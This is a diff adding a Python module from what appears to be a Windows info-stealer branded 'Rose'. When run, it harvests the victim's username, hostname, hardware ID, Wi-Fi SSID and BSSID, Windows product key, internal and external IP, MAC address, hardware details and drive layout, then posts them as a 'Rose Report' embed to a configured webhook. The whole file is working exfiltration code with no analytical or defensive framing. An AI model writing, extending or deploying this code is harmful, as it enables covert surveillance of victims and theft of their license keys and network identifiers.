@@ -1,0 +1,236 @@
+import os
+import subprocess
+import cpuinfo
+import GPUtil
+import sys
+import psutil
+import pywifi
+import uuid
+import pyautogui
+import pygame.camera
+import socket
+import platform
+import requests
+from config import Config
+from datetime import datetime
+
+cc = Config()
+
+webhook = cc.get_webhook()
+eb_color = cc.get_color()
+
+def get_drive_info():
+    drive_info = []
+    partitions = psutil.disk_partitions()
+
+    for partition in partitions:
+        drive = {}
+        drive['device'] = partition.device
+        drive['mountpoint'] = partition.mountpoint
+
+        try:
+            usage = psutil.disk_usage(partition.mountpoint)
+            drive['total'] = usage.total
+            drive['used'] = usage.used
+            drive_info.append(drive)
+        except OSError as e:
+            continue
+
+    return drive_info
+
+def format_drive_info(drives):
+    formatted_info = []
+    for drive in drives:
+        formatted = (
+            f"Drive: {drive['device']} (Mountpoint: {drive['mountpoint']}) - "
+            f"Total Space: {drive['total']} bytes - "
+            f"Used Space: {drive['used']} bytes"
+        )
+        formatted_info.append(formatted)
+    return " - ".join(formatted_info)
+
+pygame.camera.init()
+username = str(os.getenv("USERNAME"))
+hostname = str(os.environ['COMPUTERNAME'])
+hwid = subprocess.check_output('wmic csproduct get uuid').split(b'\n')[1].strip()
+decoded_hwid = str(hwid.decode("utf-8"))
+wifi = pywifi.PyWiFi()
+iface = wifi.interfaces()[0]
+iface.scan()
+scan_results = iface.scan_results()
+for result in scan_results:
+    ssid = result.ssid
+    bssid = result.bssid
+lang = subprocess.check_output('wmic os get MUILanguages /format:list').decode().strip().split('\r\r\n')[0].split('=')[1]
+system = str(subprocess.check_output('wmic os get Caption /format:list').decode().strip().split('\r\r\n')[0].split('=')[1])
+output = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True).decode().strip()
+product_key = str(output.split('\n', 1)[-1].strip())
+ram = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
+power = str(psutil.sensors_battery().percent)
+screen = str(pyautogui.size())
+webcams_count = len(pygame.camera.list_cameras())
+internal_ip = str(socket.gethostbyname(socket.gethostname()))
+external_ip = str(requests.get('https://api.ipify.org').text)
+gpus = GPUtil.getGPUs()
+gpu_info = str("")
+for gpu in gpus:
+    gpu_info += f"GPU Name: {gpu.name} - GPU Driver: {gpu.driver} - GPU Memory Total: {gpu.memoryTotal}MB - GPU Memory Free: {gpu.memoryFree}MB - GPU Memory Used: {gpu.memoryUsed}MB"
+info = cpuinfo.get_cpu_info()
+cpu_info = str(f"CPU Name: {info['brand_raw']} - CPU Architecture: {info['arch']} - CPU Cores: {info['count']}")
+current_execution_path = str(os.path.join(os.getcwd(), sys.argv[0]))
+drives = get_drive_info()
+drive_info_string = str(format_drive_info(drives))
+mac_address = str(':'.join(['{:02X}'.format((uuid.getnode() >> elements) & 0xFF) for elements in range(0,2*6,2)][::-1]))
+processor_id = str(platform.processor())
+device_model = (str(subprocess.check_output("wmic csproduct get name"), "utf-8").split("\n")[1].strip())
+current_time_iso = datetime.now().isoformat()
+
+def send_device_information():
+
+    embed = {
+        "title":
+        "Rose Report",
+        "description":
+        "Rose Instance - System Information",
+        "color":
+        eb_color,
+        "fields": [
+            {
+                "name": "Hostname",
+                "value":
+                    f"`{hostname}`",
+                "inline": False,
+            },
+            {
+                "name": "Username",
+                "value":
+                    f"`{username}`",
+                "inline": False,
+            },
+            {
+                "name": "Device Model",
+                "value":
+                    f"`{device_model}`",
+                "inline": False,
+            },
+            {
+                "name": "HWID",
+                "value":
+                    f"`{decoded_hwid}`",
+                "inline": False,
+            },
+            {
+                "name": "SSID",
+                "value":
+                    f"`{ssid}`",
+                "inline": False,
+            },
+            {
+                "name": "BSSID",
+                "value":
+                    f"`{bssid}`",
+                "inline": False,
+            },
+            {
+                "name": "Language",
+                "value":
+                    f"`{lang}`",
+                "inline": False,
+            },
+            {
+                "name": "System",
+                "value":
+                    f"`{system}`",
+                "inline": False,
+            },
+            {
+                "name": "Product Key",
+                "value":
+                     f"`{product_key}`",
+                "inline": False,
+            },
+            {
+                "name": "RAM",
+                "value":
+                    f"`{ram}`",
+                "inline": False,
+            },
+            {
+                "name": "Power",
+                "value":
+                    f"`{power}%`",
+                "inline": False,
+            },
+            {
+                "name": "Screen",
+                "value":
+                    f"`{screen}`",
+                "inline": False,
+            },
+            {
+                "name": "Webcams",
+                "value":
+                    f"`{webcams_count}`",
+                "inline": False,
+            },
+            {
+                "name": "Internal IP",
+                "value":
+                    f"`{internal_ip}`",
+                "inline": False,
+            },
+            {
+                "name": "External IP",
+                "value":
+                    f"`{external_ip}`",
+                "inline": False,
+            },
+            {
+                "name": "GPU",
+                "value":
+                    f"`{gpu_info}`",
+                "inline": False,
+            },
+            {
+                "name": "CPU",
+                "value":
+                    f"`{cpu_info}`",
+                "inline": False,
+            },
+            {
+                "name": "Current Execution Path",
+                "value":
+                    f"`{current_execution_path}`",
+                "inline": False,
+            },
+            {
+                "name": "Drives",
+                "value":
+                    f"`{drive_info_string}`",
+                "inline": False,
+            },
+            {
+                "name": "MAC Address",
+                "value":
+                    f"`{mac_address}`",
+                "inline": False,
+            },
+            {
+                "name": "Processor ID",
+                "value":
+                    f"`{processor_id}`",
+                "inline": False,
+            }
+        ],
+        "footer": {
+            "text": cc.get_footer(),
+            "icon_url": cc.get_avatar()
+        },
+        "author": {
+            "name": cc.get_name(),
+            "icon_url": cc.get_avatar()
+        },
+        "timestamp": current_time_iso
+    }
+
+    requests.post(webhook, json={"embeds": [embed]})
